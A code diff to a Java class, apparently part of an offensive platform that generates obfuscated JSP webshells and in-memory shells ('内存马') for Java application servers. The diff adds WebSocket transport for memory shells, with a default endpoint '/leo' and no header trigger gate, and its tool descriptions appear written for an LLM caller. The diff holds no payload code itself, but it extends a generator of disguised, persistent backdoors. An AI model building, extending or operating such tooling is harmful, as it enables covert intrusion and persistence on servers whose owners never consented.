@@ -107,6 +107,10 @@ public class ShellGeneratorTools {
         data.put("packerAvailability", PackerRegistry.getAvailabilityMap());
         data.put("targetJavaVersions", targetJavaVersions());
         data.put("servletNamespaces", ServerInjectorMapper.getSupportedServletNamespaces());
+        Map<String, Object> transportProtocols = new LinkedHashMap<>();
+        transportProtocols.put("webshell", ShellGeneratorConfig.getSupportedWebShellProtocols());
+        transportProtocols.put("memoryshell", ShellGeneratorConfig.getSupportedMemoryShellProtocols());
+        data.put("transportProtocols", transportProtocols);
         data.put("obfuscationSteps", JspObfuscationPipeline.getStepDescriptors());
         data.put("runtimeGenerators", scriptGeneratorService.getMetadata());
         return data;
@@ -267,7 +271,7 @@ public class ShellGeneratorTools {
           "reqDisguiseId / respDisguiseId：请求/响应伪装器 ID，必填，从 getPuppetShellConfig 获取。" +
           "shellType：JSP 或 JSPX，必填。" +
           "coreClassName：核心类名，留空自动生成。" +
-          "protocol：http / httpchunk，从 getPuppetShellConfig 获取，默认 http。" +
+          "protocol：http / httpchunk（HTTPCHUNK 仅 JSP/JSPX），从 getPuppetShellConfig 获取，默认 http。" +
           "targetJavaVersion：目标运行时版本，可选 auto / 6 / 7 / 8 / 9+ / 17+，默认 auto。" +
           "servletNamespace：Servlet API 命名空间，可选 auto / javax / jakarta，默认 auto（当前解析为 javax）。" +
           "respCode：响应状态码，默认 200。" +
@@ -338,14 +342,14 @@ public class ShellGeneratorTools {
           "将这三个值直接传入本工具，确保生成的内存马与目标节点通信协议完全匹配，避免内存马无法连接。" +
           "前端通过 GET /platform/shell-generator/result/{resultId} 取回完整代码，勿让 LLM 转述完整代码。" +
           "reqDisguiseId / respDisguiseId：请求/响应伪装器 ID，必填，从 getPuppetShellConfig 获取。" +
-          "headerName / headerValue：触发 Header 键值对，必填。" +
+          "headerName / headerValue：http 模式下为必填触发 Header；websocket 模式不使用 Header 门禁。" +
           "serverType：目标应用服务器类型，必填，可通过 getShellGeneratorMeta 获取。" +
           "shellType：注入器形态，必填，可通过 getShellGeneratorMeta 获取。" +
           "packerType：打包器类型，必填，可通过 getShellGeneratorMeta 获取。" +
-          "protocol：http / httpchunk，从 getPuppetShellConfig 获取，默认 http。" +
+          "protocol：http / websocket，从 getPuppetShellConfig 获取，默认 http；HTTPCHUNK 仅支持 JSP/JSPX WebShell。" +
           "targetJavaVersion：目标运行时版本，可选 auto / 6 / 7 / 8 / 9+ / 17+，默认 auto；" +
           "servletNamespace：Servlet API 命名空间，可选 auto / javax / jakarta，默认 auto（当前解析为 javax）；" +
-          "urlPattern：URL 映射模式，默认 /*。" +
+          "urlPattern：http 模式默认 /*；websocket 模式为端点路径，默认 /leo，必须以 / 开头且不能含 *。" +
           "coreClassName / injectorClassName / shellClassName：留空自动生成随机类名。" +
           "isAbstractTranslet：默认 false。byPassJavaModule：默认 false。respCode：默认 200。" +
           "jspObfuscationSteps：混淆步骤 ID 有序列表，null 使用默认策略，空列表不混淆。" +
@@ -373,14 +377,18 @@ public class ShellGeneratorTools {
         Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
         Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
 
+        String normalizedProtocol = ShellGeneratorConfig.normalizeProtocol(protocol);
+        boolean webSocketBuild = "websocket".equals(normalizedProtocol)
+                || "WebSocketInjector".equals(shellType);
+
         ShellGeneratorConfig.Builder builder = ShellGeneratorConfig
                 .builder(reqDisguise, respDisguise)
-                .header(requireNonBlank(headerName,  "headerName"),
-                        requireNonBlank(headerValue, "headerValue"))
+                .header(webSocketBuild ? emptyIfNull(headerName) : requireNonBlank(headerName, "headerName"),
+                        webSocketBuild ? emptyIfNull(headerValue) : requireNonBlank(headerValue, "headerValue"))
                 .serverType(requireNonBlank(serverType, "serverType"))
                 .shellType(requireNonBlank(shellType,   "shellType"))
                 .packerType(requireNonBlank(packerType, "packerType"))
-                .urlPattern(isBlank(urlPattern) ? "/*" : urlPattern.trim())
+                .urlPattern(isBlank(urlPattern) ? (webSocketBuild ? "/leo" : "/*") : urlPattern.trim())
                 .abstractTranslet(isAbstractTranslet != null && isAbstractTranslet)
                 .respCode(respCode != null ? respCode : 200);
 
@@ -411,6 +419,7 @@ public class ShellGeneratorTools {
         Map<String, Object> meta = new LinkedHashMap<>();
         meta.put("packerType",        config.getPackerType());
         meta.put("shellType",         config.getShellType());
+        meta.put("protocol",          config.getProtocol());
         meta.put("serverType",        config.getServerType());
         meta.put("coreClassName",     config.getCoreClassName());
         meta.put("injectorClassName", config.getInjectorClassName());
@@ -422,7 +431,9 @@ public class ShellGeneratorTools {
         meta.put("obfuscationSeed", Long.toString(config.getObfuscationSeed()));
         meta.put("compatibilityWarnings", compatibilityWarnings);
         meta.put("servletNamespace", config.getEffectiveServletNamespace().getValue());
-        meta.put("headerConfig",      headerName + " : " + headerValue);
+        meta.put("headerConfig",      config.isWebSocketProtocol()
+                ? "WebSocket endpoint: " + config.getUrlPattern()
+                : headerName + " : " + headerValue);
         meta.put("templateMutated",   !isBlank(customJspTemplate));
         meta.put("lines",             code.split("\n").length);
         meta.put("chars",             code.length());
@@ -511,6 +522,10 @@ public class ShellGeneratorTools {
 
     private boolean isBlank(String value) {
         return value == null || value.isBlank();
+    }
+
+    private String emptyIfNull(String value) {
+        return value == null ? "" : value.trim();
     }
 
     private List<String> targetJavaVersions() {
